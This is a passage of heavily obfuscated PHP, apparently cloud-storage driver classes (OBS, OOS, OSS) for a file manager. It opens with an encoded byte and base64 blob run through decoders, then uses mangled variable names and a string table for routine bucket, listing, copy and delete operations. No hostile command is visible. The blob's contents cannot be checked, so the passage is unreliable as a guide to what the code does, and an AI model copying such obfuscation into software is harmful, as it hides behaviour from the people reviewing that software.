xc0\x84\xf4\x51\x6a\xcc\xea\xc4\x4d\x86\x50\x9a\xcd\x8f\xe2\xdc\x5d\xa5\xbd\x42\x91\x2b\x42\xbb\x6e\x22"."\213\305\67\3\12\151\346\22\362\230\112\225\134\354\120\205\175\215\173\164\7\312\217\140\114\233\37\217\161\365\201\264\264\175\106\144\376\66\101\213\170\227\211\246\72\124\53\244\327\44\70\50".base64_decode('agZrvMbaRnRpyWMc0ondFXVrHuMSEkeDotLOS/Z9m23d7K0OobFLgoIAv3nlFhY4U+BRXA==')."\122\364\254\322\76\250\225\327\211\133\120\20\12\303\300\300\224\364\224\131\112\343\15\121\362\123\124\260\143\172\106\216\22\355\15\266\32\204\277\177\271\12\354\374\115\42\73\170\25\6\122\166".base64_decode('WXYlJz0JgmLS0y8SI+ptVDgHq9KaaWSOlEHgqzGzLmmsZP5HJFPxcpJfsbtYTGZRqMgcHA==').base64_decode('MxHEFRDfXrgHlpyHqsWu+EXP5CLkmxVFaB5mooQtoZxj4TddetksVsup8imSJY1oimEarA==')."\xf2\xb5\x62\x90\x20\x63\x5c\x67\xaa\xee\xde\xc6\x26\xef\x5c\x38\xc1\xc8\xf6\x85\xec\x70\x6\xfb\x8\x5a\x58\x12\x1a\xe0\xe3\x2d\x23\x63\xa0\x28\xe\x70\x2\xc6\x94\x14\x15\x88\x37\x2d\xe1\x9f\x87\x38\x8\xe3"."\363\111\74\211\361\130\111\342\45\164\256\104\116\134\155\311\144\135\150\156\121\335\162\14\320\133\55\237\216\20\316\156\163\130\3\270\0\320\372\160\346\303\353\56\242\61\324\333\227\351\320\316".base64_decode('dFUCTwjJ79eQUqIfwmQCJZn0DRlpYIQGGnVCxmxCOJETyQmTJ1ZqsWGshCqpIwY48dbVYw==')."\x47\xc\xe\x69\x63\xd7\x38\x37\x97\xc7\x1a\xa2\x78\x93\xe6\x36\x0\x96\x1c\x61\xb9\x1c\x39\x2d\x47\x84\x6a\xc4\x3a\x4a\xf3\x24\xe\x35\xaa\x33\x9f\xa\xec\xa4\xde\xd3\xd9\xe3\xe7\x49\xad\x7c\x79\x52\x41\x89"."\xf0\x71\x18\x64\x6a\xa7\xfa\x98\xe\x7\xbc\xd1\xbc\x91\x52\x22\xd1\x8e\x70\x30\x10\x69\xb\xc7\x57\x2a\x19\x7c\xab\xca\x39\x15\xf2\x4\x94\x73\x29\x13\x29\x31\x1d\x78\x86\xd5\x49\xfe\x1c\x11\xe\x7a\x93\xe8"."\304\340\115\363\123\225\45\316\117\244\57\120\231\170\273\321\131\55\305\77\275\124\121\143\1\33\71\346\52\312\140\331\167\25\350\234\220\364\112\300\305\222\136\11\77\256\143\105\120\251\305\122"."\201\162\225\326\0\174\365\57\220\67\244\144\150\304\10\351\205\351\32\157\24\106\14\313\20\13\237\225\30\227\153\17\264\165\205\273\325\100\44\22\135\355\320\237\26\122\377\22\27\231\244\345".strrev('P¦Á³pÓè—KÒX¯ozTh}÷óïUvE¬Ÿdút(Ä¸¥oÊJé^¿@“™¤¼÷')."\313\345\34\257\347\346\6\245\150\331\271\263\126\375\224\112\77\300\322\10\113\73\75\100\54\334\321\231\370\37\67\325\110\13\157\213\106\232\151\330\161\313\161\372\364\117\120\176\151\231\175\123"."\74\60\125\231\362\77\175\257\320\43\71\252\43\136\341\330\303\250\46\71\40\1\367\116\323\302\121\225\172\233\23\237\100\374\112\151\274\50\337\267\372\323\120\3\366\53\33\142\167\173\70\42"."\116\50\30\12\52\301\137\241\347\126\164\34\307\242\103\166\226\141\142\70\104\60\140\300\35\132\246\256\7\27\335\146\4\216\347\24\53\276\101\136\367\241\171\344\16\12\101\16\210\76\241\30"."\177\315\113\24\165\347\124\151\0\312\126\204\160\213\3\50\55\112\3\175\373\223\277\324\244\54\145\376\61\304\7\210\157\310\120\276\150\73\316\364\235\262\111\221\64\45\64\1\113\172\112\134"."\x54\x47\xe7\x9c\x45\xf1\xc4\xb6\xb0\xc9\x54\xe5\x5d\x92\x30\x4a\xe2\xa4\x87\x15\x4e\xcd\xfc\x78\x45\x82\x43\xe\x16\x61\xbd\xe1\x2a\xe1\xf8\x75\xab\xc2\xa0\x29\x8f\x3a\xa1\xe7\xd8\xaa\x8c\xbe\xec\x4b\x45\xe"."\36\164\362\320\355\312\67\2\151\361\377\233\202\64\63\56\71\11\166\126\122\331\40\313\275\123\12\256\15\77\177\230\65\107\235\317\375\342\24\367\203\207\216\247\16\245\25\106\274\75\310\217"."\63\72\13\171\52\136\31\123\310\113\355\12\42\106\60\367\130\43\207\35\151\11\260\364\351\231\364\247\37\176\331\156\350\156\4\245\163\360\311\172\216\212\301\254\221\113\227\270\312\231\110\350"."\xd2\x85\x9c\x81\x94\xc2\x5a\x57\x1a\x7b\x91\x9e\x3c\x85\xda\xc6\x48\x3a\x3c\x6c\x56\xed\x15\x4c\xec\x11\xd6\xf9\x3e\x9b\x78\xf6\x4e\x6c\xbd\xce\x67\xc0\xf8\x6d\xbe\x25\x96\x90\x65\x3b\x1e\x9e\x4b\x98\x9\x2d".base64_decode('46GoiomiiLWOy2HZTIH0AmUyWWCaz/cyCYC9JZv2kIdOKV10v5wmrU9OfuXSmZyZ1HKgDw==')."\351\260\101\54\241\303\230\316\266\20\7\30\115\362\153\305\242\270\371\220\167\134\364\257\303\274\34\362\172\23\235\52\161\265\242\122\365\204\270\300\71\351\66\222\46\302\315\144\271\20\246\67".strrev('ßˆIT.Î°Q@d:ÇJ¼¯í4üG¢:‰s]’®Lô=¨à¥a[Ókİ”Lt’Ô0')."\23\371\34\7\0\312\122\105\240\206\143\41\143\124\102\314\64\175\112\226\120\12\231\242\175\116\252\364\252\37\74\131\133\355\221\76\212\371\344\247\115\37\344\147\42\34\27\274\201\354\56\112".strrev('¬>‡Ü\\œTv?œæ8ß8TÑ?˜Oû{ÏôƒõÅŸiÛ]å[<–Ë‚½—|­“_¸Öh')."\256\2\61\367\40\47\314\112\361\262\120\66\160\74\332\53\365\32\110\133\345\303\277\322\60\110\375\56\227\162\36\242\167\341\141\352\214\125\337\16\166\274\104\350\236\320\52\257\17\177\141\205"."\140\357\101\316\154\151\47\325\153\136\232\54\261\13\152\67\230\341\300\135\264\1\13\233\110\352\114\273\142\203\130\233\117\67\315\235\277\130\226\215\210\51\24\327\266\340\136\6\156\237\201\307".base64_decode('EUihONFQYR685dVPMp0GRZUPVbt2gP/ZghGHDwoqqdzy+qo9aynhqaT4JW2ILg0fEyvdWA==').base64_decode('YtXRLVA8T+38FmUfqvRD2vfEYqFPDZs5fETPY9G/XdKc59Fqxy4yEuyMh6W3IubUgQJhjA==')."\310\226\316\145\162\215\266\351\226\44\341\342\170\137\44\122\321\150\201\275\31\211\275\165\210\325\46\121\242\377\301\4\262\43\26\75\215\11\345\57\334\175\307\311\334\71\12\376\25\214\314\124"."\x79\x56\x5a\x52\x8d\xf9\x9c\x3e\x50\x4e\x8f\x1f\x2d\xbd\x9a\xed\x95\x90\x53\x92\x44\xea\x76\x94\x4c\x36\x90\xb\x71\x2\x76\xf6\xdb\x55\x3d\x2a\x26\xea\x18\xf0\x28\xd3\x1\x55\xb2\x7b\xd2\xeb\xd3\xc2\x43\xa4"."\xc4\xe8\xe1\xd2\xcc\xd6\x7e\x1a\x1\x2\x31\xf5\x76\xb2\x4c\xf2\xe3\xb8\xc4\x4e\x5a\xb8\x32\x22\x4b\xd7\xb1\x8c\x25\x87\xf9\xb2\x9d\x31\xa9\x48\x5e\x1f\x95\x55\x4b\x4f\xd\xb\x1\x13\x91\x48\x41\x8f\x60\x71".base64_decode('E10J0sxAB7dS1yRNPqfUC5g7sUjw2EtPyZtyWHrCGu0JUWYQgprjOMaiuPAgL9GvtCuRjQ==').base64_decode('GSEagh5K3g8cRyX++qrj6GS5n2BGrKDjSZd0xav1QDiJsSD9mrT1il1WhLrLeRGRZMfkvA==')."\305\63\35\116\42\260\37\104\27\215\140\256\47\54\327\313\354\324\323\72\15\263\143\301\377\372\365\341\377\127\217\16\317\157\140\122\176\134\77\267\6\354\0\346\34\132\213\257\122\271\254\203"."\x4a\x98\x5d\xfd\x70\x6e\xaf\x7b\x1\x16\xa1\xc1\xf7\x8d\x8\xa2\x42\xe2\x5c\x1f\x9c\xf9\xc2\x64\x2e\x32\x35\x76\xd3\xa6\xe5\x72\xd2\x26\x5c\xfd\x38\x53\xf1\x24\x3c\x42\xbe\x21\xfe\x8c\x78\xb5\x88\xdb\x44\xda"."\375\74\174\37\21\360\262\227\337\7\252\1\12\272\304\117\115\125\360\230\46\61\146\131\320\244\202\221\32\252\162\115\116\364\141\235\57\66\110\314\111\5\230\150\3\342\141\230\223\121\77\13"."\245\360\161\221\70\324\201\321\223\235\36\104\213\354\140\131\17\273\300\300\12\106\255\210\243\25\40\132\62\241\162\44\125\220\267\204\143\116\34\211\362\160\13\32\344\143\323\351\50\321\345\172"."\xed\x9a\x2\x59\xf2\xd8\x3a\x6e\x6\x2a\xb5\x26\x2a\x4b\x73\x3a\x20\x17\xc1\x6a\xf8\x4e\xd1\x18\x9e\x60\xdc\x30\x6f\x83\xd7\x95\xd0\xe8\x75\x55\xc7\x1f\xfc\x76\xe2\xba\xe3\x5\x6a\xaa\x69\x82\x16\x48\xc\x8b"."\100\230\50\214\134\56\221\133\146\157\145\31\212\327\161\1\63\315\312\252\276\276\171\243\204\70\20\207\344\361\140\164\242\247\144\22\106\321\231\312\305\102\222\146\164\112\222\271\272\171\77\232"."\74\323\127\261\153\61\222\351\230\51\254\232\47\56\65\23\321\130\110\135\35\306\16\72\302\353\102\275\314\265\264\141\222\27\141\130\225\275\135\165\304\24\17\26\0\72\305\264\233\2\225\164"."\104\314\44\1\260\360\217\154\347\213\101\176\5\353\64\365\226\354\35\230\167\62\131\44\351\4\306\106\53\316\265\270\254\32\130\312\54\131\262\163\121\107\46\146\273\114\224\33\143\347\350\336"."\2\132\310\172\312\326\323\12\336\300\35\74\175\337\274\206\271\3\237\127\313\74\366\352\44\202\234\367\5\220\160\270\210\317\365\62\55\136\6\123\265\234\111\275\11\125\313\103\270\31\267\35"."\x48\x24\x9e\x13\x72\x3f\x23\xd4\xee\xf0\xd4\xd5\x2c\x89\x48\x15\xe2\xb3\xc\xde\x93\x9a\x66\x6e\xba\xcd\xa0\x60\x2d\x5c\x79\x98\x34\x4c\x9f\x8b\x4f\xa7\xfc\x9e\x99\xbd\x3e\x83\x35\xe4\xfc\xd8\xa5\x19\x36\xc3"._kodDe('LQThVO0r363FBbuhdzE9Zzm2+S2eswTdiGnDBaVkvPzcvhPzkngL943z5RXVj9oODcOn+L8=')."\330\110\46\111\146\76\314\241\6\351\246\327\171\321\316\215\164\53\366\277\262\21\221\262\111\51\346\13\27\375\142\117\4\141\341\120\212\144\323\73\254\300\210\306\175\266\271\113\365\72\16\262"."\xd2\xb5\x7c\x8a\x50\x88\x50\xe5\xcd\xab\xb8\x10\x96\xb8\x47\x56\xc\x9f\x84\xc5\xc6\xee\x4a\x97\x28\xaa\xd8\xf3\xb4\x11\xc1\xb\x8b\xb3\x58\x3a\xdd\xae\x8d\x54\x1\x4d\xeb\x6e\x9f\x7b\x28\x85\x83\x12\x5e\x5a"."\162\55\42\114\142\364\121\371\353\0\47\54\126\34\200\225\251\302\365\210\124\136\334\301\211\156\342\264\152\335\47\24\316\131\134\166\155\302\221\112\44\321\7\266\270\16\213\164\356\305\112\76"."\x42\xb9\x85\x76\x85\x8b\x77\xc4\x27\x9d\x8e\x54\x38\x18\x9f\x33\x4\x43\xec\xe5\xbc\x8e\x54\xd7\x49\x1e\x4b\xd2\x18\x1f\xe8\xca\x2\xd9\x92\x54\x7d\x55\x11\x94\x84\x2\x7a\x2e\x22\x55\x27\xdf\xc4\x4f\x5b\x20".base64_decode('Xv0jAiudQyx5oBEZjGUxHYMv7Vm8YwAZkzMdzXFPLTl4CvSliXkixqd5AWcWhdddrZcLuA==')."\173\106\113\70\336\136\224\323\107\15\73\225\225\116\311\225\231\225\351\245\212\301\206\6\124\357\207\273\265\154\254\335\262\3\121\111\105\173\44\65\237\204\131\245\14\155\121\325\142\64\13\227".base64_decode('FIcTR9lphgCXpVm4bEU2K1wxrqScrZWtabpXOXggi0pX6bCQ2Eig041nVeDKzwEmuqGJ8A==').base64_decode('qnorhMzJpW5RrRVVgadthRta8Bz4BFotx6Gd5NxRqtFtllOFUlMqNK3aklDlqdwyRF4VxQ==')."\42\372\111\314\375\310\316\55\253\144\313\132\112\325\365\230\142\125\251\214\345\124\60\162\245\313\3\4\356\327\201\203\6\4\106\54\130\316\30\22\12\234\314\176\143\246\143\53\51\27\206\12"."\46\337\236\322\102\77\27\163\116\201\222\173\234\53\152\163\242\176\241\54\71\302\257\152\116\342\301\202\241\112\21\114\116\343\166\175\102\307\215\236\231\115\333\110\351\116\157\373\262\217\113\232".base64_decode('zz6Sk8TQLgmwEFM5FGCqyEVJEnDM4jKG1icxRwInHNZelCWBOyx6/R3EOhn84pO4fKdbOA==').base64_decode('zY6bJduD8xJmkfy2mrYttEmoXIiw2Xgf9kjKUigkbjlxo8j1GUFbQrFIEC7iscAlrtNcQg==')."\xe7\x1c\x11\x7c\x2d\xc7\x23\xf2\x36\xb\x17\xf2\xed\x65\x97\xca\x80\x48\x18\x32\xd3\x49\x73\x8c\x39\x96\xc4\x9e\x3d\x44\x7b\xc4\xc5\x9d\xe6\xe6\x2d\x5\x5b\x4\xa8\x28\xab\x7e\x11\xff\x29\x96\x9f\xe6\xf8\xe1".base64_decode('aScvqQPelPVtKGYcxekrnVxF+/NqAOG9qIK+60IkqWCNFk/EK7J6AvH46misjT4DU5FNSg==')."\111\252\164\25\131\75\235\321\356\351\362\102\135\201\160\244\42\17\153\335\165\253\302\105\51\315\12\367\220\126\222\273\347\351\132\21\16\256\24\55\251\364\14\313\356\312\42\360\354\250\230\27"."\351\356\250\230\65\331\225\20\203\217\153\71\46\14\222\356\26\364\274\360\141\53\312\70\145\134\362\374\133\314\331\64\17\70\337\136\164\51\301\62\304\206\212\260\146\135\67\324\35\53\102\52".strrev(')3æŠ‚oFà`ÅrF\'yPï|–«³	\'ïySÂJ"zÉÒ‘	PçÃÕB¼–ËçÎÓ‡>~')."\335\171\321\23\27\130\226\303\360\112\232\224\64\354\310\266\265\114\125\315\10\52\116\306\24\103\10\172\377\17\111\364\266\110\174\271\0\0".""."", 10, -8))); goto Bàã›®Ò˜ù; cƒàÏ“ÉÒ: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($£æÎ‡) { parent::__construct($£æÎ‡); $this->setSignVersion($_SERVER[÷åé¼î][247]); } public function fileOutImage($ê˜ÀÛ©à, $ÔŸºÇ»æ = 250) { $»•êò¿ğ =& $_SERVER[÷åé¼î]; if ($this->size($ê˜ÀÛ©à) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ê˜ÀÛ©à, $ÔŸºÇ»æ); } $…“˜”ƒ = array($»•êò¿ğ[1455] => $»•êò¿ğ[1456] . $ÔŸºÇ»æ . $»•êò¿ğ[1457]); $—ãÔ…ø‰ = $this->link($ê˜ÀÛ©à, $…“˜”ƒ); $this->fileOutLink($—ãÔ…ø‰); } public function fileOutLink($´Óµ„†„) { $ì§Ü—ù² =& $_SERVER[÷åé¼î]; if (substr($´Óµ„†„, 0, 7) == $ì§Ü—ù²[1404]) { $´Óµ„†„ = $ì§Ü—ù²[1405] . substr($´Óµ„†„, 7); } header($ì§Ü—ù²[175] . $´Óµ„†„); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ ËĞçœø) { parent::__construct($ ËĞçœø); $this->setSignVersion($_SERVER[÷åé¼î][247]); } public function fileOutLink($²·ŸéØ) { $™×Üî¯ë =& $_SERVER[÷åé¼î]; if (substr($²·ŸéØ, 0, 7) == $™×Üî¯ë[1404]) { $²·ŸéØ = $™×Üî¯ë[1405] . substr($²·ŸéØ, 7); } header($™×Üî¯ë[175] . $²·ŸéØ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($±­ş) { parent::__construct(); include_once SDK_DIR . $_SERVER[÷åé¼î][1458]; $this->_init($±­ş); } public function _init($Ãéœ¦¦š) { $’§ôÊ÷¾ =& $_SERVER[÷åé¼î]; $this->config = $Ãéœ¦¦š; foreach ($Ãéœ¦¦š as $¸ªÚ “˜ => $÷á±©Ü­) { if (isset($this->{$¸ªÚ “˜})) { $this->{$¸ªÚ “˜} = $÷á±©Ü­; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($’§ôÊ÷¾[1459] . LNG($’§ôÊ÷¾[1460])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $öÉˆğçë =& $_SERVER[÷åé¼î]; $Ï»Æ©òÜ = new OSS\Model\CorsConfig(); $‘ß‹‘µ  = new OSS\Model\CorsRule(); $‘ß‹‘µ ->addAllowedOrigin($öÉˆğçë[1461]); $‘ß‹‘µ ->addAllowedMethod($öÉˆğçë[1462]); $‘ß‹‘µ ->addAllowedMethod($öÉˆğçë[1463]); $‘ß‹‘µ ->addAllowedMethod($öÉˆğçë[1464]); $‘ß‹‘µ ->addAllowedMethod($öÉˆğçë[1465]); $‘ß‹‘µ ->addAllowedMethod($öÉˆğçë[165]); $‘ß‹‘µ ->setMaxAgeSeconds(600); $‘ß‹‘µ ->addExposeHeader($öÉˆğçë[1466]); $‘ß‹‘µ ->addAllowedHeader($öÉˆğçë[1461]); $Ï»Æ©òÜ->addRule($‘ß‹‘µ ); try { $this->client->putBucketCors($this->bucket, $Ï»Æ©òÜ); } catch (OSS\Core\OssException $‘÷ÁÚ„) { $this->writeLog(__FUNCTION__ . $öÉˆğçë[214] . $‘÷ÁÚ„->getMessage()); return !1; } return !0; } public function getBucketCors() { $Æ×²ÈÔ³ =& $_SERVER[÷åé¼î]; $­çš›¢ˆ = null; try { $­çš›¢ˆ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $‚¥Ù“½Ş) { $this->writeLog(__FUNCTION__ . $Æ×²ÈÔ³[214] . $‚¥Ù“½Ş->getMessage()); return null; } if (!$­çš›¢ˆ || !($•®ÎƒÀõ = $­çš›¢ˆ->getRules())) { return null; } $½Ç†éäÀ = $•®ÎƒÀõ[0]->getAllowedOrigins(); $™¡Ö¤Éó = $•®ÎƒÀõ[0]->getAllowedMethods(); $şÛÏÜÈ¼ = $•®ÎƒÀõ[0]->getMaxAgeSeconds(); $­½æêÖ¬ = $•®ÎƒÀõ[0]->getExposeHeaders(); $§¯½—Ï = $•®ÎƒÀõ[0]->getAllowedHeaders(); return array($Æ×²ÈÔ³[218] => isset($½Ç†éäÀ[0]) ? $½Ç†éäÀ[0] : $Æ×²ÈÔ³[12], $Æ×²ÈÔ³[222] => $™¡Ö¤Éó, $Æ×²ÈÔ³[1467] => $şÛÏÜÈ¼, $Æ×²ÈÔ³[1468] => isset($­½æêÖ¬[0]) ? $­½æêÖ¬[0] : $Æ×²ÈÔ³[12], $Æ×²ÈÔ³[219] => isset($§¯½—Ï[0]) ? $§¯½—Ï[0] : $Æ×²ÈÔ³[12]); } public function isBucketCors() { $»äÇµü¾ =& $_SERVER[÷åé¼î]; $¾öã‡›¿ = $this->getBucketCors(); if (!$¾öã‡›¿ || !is_array($¾öã‡›¿)) { return !1; } if ($¾öã‡›¿[$»äÇµü¾[218]] != $»äÇµü¾[220] || $¾öã‡›¿[$»äÇµü¾[219]] != $»äÇµü¾[220]) { return !1; } $öÇ¹¾À = array_map($»äÇµü¾[221], $¾öã‡›¿[$»äÇµü¾[222]]); if (!is_array($öÇ¹¾À)) { $öÇ¹¾À = array(); } $Äò£„‹© = array($»äÇµü¾[223], $»äÇµü¾[224], $»äÇµü¾[225], $»äÇµü¾[226], $»äÇµü¾[227]); $€Ä½ò = array_diff($Äò£„‹©, $öÇ¹¾À); return empty($€Ä½ò); } public function mkfile($¡¹øßî, $™ÂÕëä = '', $¥éå¥¯ñ = REPEAT_RENAME) { $¶å¬ªè” = $this->setContent($¡¹øßî, $™ÂÕëä); if ($¶å¬ªè” !== !1) { return $this->getPathOuter($¡¹øßî); } return !1; } public function mkdir($Ô–Ê²õö, $İÎÑË = REPEAT_SKIP) { if ($İÎÑË && $this->_isFolder($Ô–Ê²õö)) { return $this->getPathOuter($Ô–Ê²õö); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ô–Ê²õö)); } catch (OSS\Core\OssException $…ô¥‰) { $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][214] . $…ô¥‰->getMessage()); return !1; } return $this->getPathOuter($Ô–Ê²õö); } private function fileList($ÁæŞüò›, $„ç ‚‡ = '', $–ßŞ—ï’ = 0) { $ÆÄû•¸ã =& $_SERVER[÷åé¼î]; $ÁæŞüò› = trim($ÁæŞüò›, $ÆÄû•¸ã[8]); $± Åƒ¡¨ = empty($ÁæŞüò›) && $ÁæŞüò› !== $ÆÄû•¸ã[228] ? $ÆÄû•¸ã[12] : $ÁæŞüò› . $ÆÄû•¸ã[8]; $”Úšåãç = $ÆÄû•¸ã[12]; $ººÉ£óÂ = 1000; $™‚ÖŸø³ = $øğŠìó™ = array(); while (!0) { check_abort(); $”²„ÀŒ = array($ÆÄû•¸ã[1469] => $„ç ‚‡, $ÆÄû•¸ã[1470] => $± Åƒ¡¨, $ÆÄû•¸ã[1471] => $ººÉ£óÂ, $ÆÄû•¸ã[1472] => $”Úšåãç); try { $¥µùÕñ— = $this->client->listObjects($this->bucket, $”²„ÀŒ); } catch (OSS\Core\OssException $¤ş™·ğØ) { $this->writeLog(__FUNCTION__ . $ÆÄû•¸ã[214] . $¤ş™·ğØ->getMessage()); break; } $”Úšåãç = $¥µùÕñ—->getNextMarker(); $Ô¦´ïíÒ = $¥µùÕñ—->getObjectList(); $Çí©£Îó = $¥µùÕñ—->getPrefixList(); foreach ($Ô¦´ïíÒ as $°Î‡£÷Ÿ) { if ($°Î‡£÷Ÿ->getKey() == $± Åƒ¡¨) { continue; } $Ä«‚ùÌ = $°Î‡£÷Ÿ->getKey(); $Ã³Ç°¢ = $°Î‡£÷Ÿ->getSize(); $íäØİ“ä = $°Î‡£÷Ÿ->getLastModified(); $˜±ê™Ñµ = trim($°Î‡£÷Ÿ->getETag(), $ÆÄû•¸ã[121]); $®û¢æñ = $–ßŞ—ï’ ? array($ÆÄû•¸ã[32] => $Ä«‚ùÌ, $ÆÄû•¸ã[79] => $Ã³Ç°¢, $ÆÄû•¸ã[206] => strtotime($íäØİ“ä), $ÆÄû•¸ã[1473] => $˜±ê™Ñµ) : $Ä«‚ùÌ; $’¼Æ•äÈ = $Ã³Ç°¢ == 0 && substr($Ä«‚ùÌ, strlen($Ä«‚ùÌ) - 1, 1) == $ÆÄû•¸ã[8] ? !0 : !1; $ç‡ı¾ ‹ = array($ÆÄû•¸ã[79] => $Ã³Ç°¢, $ÆÄû•¸ã[1474] => $Ã³Ç°¢, $ÆÄû•¸ã[88] => strtotime($íäØİ“ä), $ÆÄû•¸ã[1475] => $íäØİ“ä, $ÆÄû•¸ã[1473] => $˜±ê™Ñµ); $this->cacheMethodInfoSet($Ä«‚ùÌ, $’¼Æ•äÈ, $ç‡ı¾ ‹); if ($’¼Æ•äÈ) { $™‚ÖŸø³[] = $Ä«‚ùÌ; continue; } $øğŠìó™[] = $®û¢æñ; } foreach ($Çí©£Îó as $ìŸ€Ç’‰) { $™‚ÖŸø³[] = $ìŸ€Ç’‰->getPrefix(); $this->cacheMethodInfoSet($ìŸ€Ç’‰->getPrefix(), !0); } if ($”Úšåãç === $ÆÄû•¸ã[12]) { break; } } $this->cacheMethodInfoSet($ÁæŞüò›, !0); return array($ÆÄû•¸ã[85] => $™‚ÖŸø³, $ÆÄû•¸ã[86] => $øğŠìó™); } public function listObject($ ÂíÕ¼, $ˆÉÚ‰èÔ = '') { $ÒÇƒß‰É =& $_SERVER[÷åé¼î]; $ ÂíÕ¼ = trim($ ÂíÕ¼, $ÒÇƒß‰É[8]); $ïß¸×“Á = empty($ ÂíÕ¼) && $ ÂíÕ¼ !== $ÒÇƒß‰É[228] ? $ÒÇƒß‰É[12] : $ ÂíÕ¼ . $ÒÇƒß‰É[8]; $ìÉÔÌ«õ = $ÒÇƒß‰É[12]; $‡÷½õÌí = 1000; $›¯÷ÔÎ² = $¡Ëª’Ÿ = array(); while (!0) { check_abort(); $ËäÆ°ş = array($ÒÇƒß‰É[1469] => $ˆÉÚ‰èÔ, $ÒÇƒß‰É[1470] => $ïß¸×“Á, $ÒÇƒß‰É[1471] => $‡÷½õÌí, $ÒÇƒß‰É[1472] => $ìÉÔÌ«õ); try { $®ÄËş = $this->client->listObjects($this->bucket, $ËäÆ°ş); } catch (OSS\Core\OssException $ãÏéĞŸº) { $this->writeLog(__FUNCTION__ . $ÒÇƒß‰É[214] . $ãÏéĞŸº->getMessage()); break; } $ìÉÔÌ«õ = $®ÄËş->getNextMarker(); $Åƒî‰ = $®ÄËş->getObjectList(); foreach ($Åƒî‰ as $Ë³ú»Ü•) { if ($Ë³ú»Ü•->getKey() == $ïß¸×“Á) { continue; } $âıŞ±ªÂ = $Ë³ú»Ü•->getKey(); $¼š¸ø¨ˆ = $Ë³ú»Ü•->getSize(); $ŸœÅªÊ = $¼š¸ø¨ˆ == 0 && substr($âıŞ±ªÂ, strlen($âıŞ±ªÂ) - 1, 1) == $ÒÇƒß‰É[8] ? !0 : !1; if ($ŸœÅªÊ) { continue; } (yield $¼š¸ø¨ˆ . $ÒÇƒß‰É[214] . $âıŞ±ªÂ); } if ($ìÉÔÌ«õ === $ÒÇƒß‰É[12]) { break; } } } public function copyFile($ã¯ËÛƒ‡, $ûë‚èÄ¢) { $ƒİÊ¼ûÆ = $this->size($ã¯ËÛƒ‡); if ($ƒİÊ¼ûÆ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ã¯ËÛƒ‡, $this->bucket, $this->pathEncode($ûë‚èÄ¢)); } catch (OSS\Core\OssException $­ÍèéÊô) { $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][214] . $­ÍèéÊô->getMessage()); return !1; } return $this->getPathOuter($ûë‚èÄ¢); } $¹“æ‹ò† = $this->multiCopyObject($ã¯ËÛƒ‡, $ûë‚èÄ¢, $ƒİÊ¼ûÆ); return $¹“æ‹ò† ? $this->getPathOuter($ûë‚èÄ¢) : !1; } private function multiCopyObject($ì£úó¼, $µ‹”„ŞÇ, $¨şŞÙïş) { $¬Üø™ü =& $_SERVER[÷åé¼î]; try { $‚ƒÅ¸« = array(); if ($¦ÕßĞµó = $this->hashMd5($ì£úó¼)) { $‚ƒÅ¸« = array(OSS\OssClient::OSS_HEADERS => array($¬Üø™ü[1476] => $¦ÕßĞµó)); } $˜¼ââÙÇ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($µ‹”„ŞÇ), $‚ƒÅ¸«); $‚ÉæäÀ¥ = 1; $æ¯æŞíÊ = 0; $Ş£„Ş¶Ÿ = array(); $Éİ²Ÿ“˜ = 1024 * 1024 * 10; $ïã†Å¾¹ = $this->client->generateMultiuploadParts($¨şŞÙïş, $Éİ²Ÿ“˜); foreach ($ïã†Å¾¹ as $Ûú¹©¨á => $¥Ø™Éª¦) { $êÜÃ¥õ = $æ¯æŞíÊ + (int) $¥Ø™Éª¦[$¬Üø™ü[1477]]; $–Ìıƒ‰Î = (int) $¥Ø™Éª¦[$¬Üø™ü[397]] + $êÜÃ¥õ - 1; $Ë‡×›Á = array($¬Üø™ü[167] => $êÜÃ¥õ, $¬Üø™ü[168] => $–Ìıƒ‰Î); $Ş£„Ş¶Ÿ[] = $this->client->uploadPartCopy($this->bucket, $ì£úó¼, $this->bucket, $this->pathEncode($µ‹”„ŞÇ), $‚ÉæäÀ¥, $˜¼ââÙÇ, $Ë‡×›Á); $‚ÉæäÀ¥ = $‚ÉæäÀ¥ + 1; } $¨«šÙ = array(); foreach ($Ş£„Ş¶Ÿ as $Ûú¹©¨á => $Ÿ¦ª·Û) { $¨«šÙ[] = array($¬Üø™ü[1478] => $Ûú¹©¨á + 1, $¬Üø™ü[1479] => $Ÿ¦ª·Û); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($µ‹”„ŞÇ), $˜¼ââÙÇ, $¨«šÙ); } catch (OSS\Core\OssException $¸ÃÑ¯¶º) { $this->writeLog(__FUNCTION__ . $¬Üø™ü[214] . $¸ÃÑ¯¶º->getMessage()); return !1; } return !0; } public function moveFile($Ò…‘‹Ø, $‰¸‘®ø) { if ($this->copyFile($Ò…‘‹Ø, $‰¸‘®ø)) { $this->remove($Ò…‘‹Ø); return $this->getPathOuter($‰¸‘®ø); } return !1; } public function delFile($ææşº†£) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ææşº†£)); } catch (OSS\Core\OssException $‚¨Õã—) { $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][214] . $‚¨Õã—->getMessage()); return !1; } return !0; } public function delFolder($ê¥˜üéó) { $¢‹»¿Ù =& $_SERVER[÷åé¼î]; if (!$this->exist($ê¥˜üéó)) { return !0; } $this->listItemCache = !1; $ªõ§«Ò = $this->fileList($ê¥˜üéó); $this->listItemCache = !0; $Îó‹òÁº = trim($ê¥˜üéó, $¢‹»¿Ù[8]) . $¢‹»¿Ù[8]; if (!empty($ê¥˜üéó) && $ê¥˜üéó !== $¢‹»¿Ù[228] && !in_array($Îó‹òÁº, $ªõ§«Ò[$¢‹»¿Ù[85]])) { 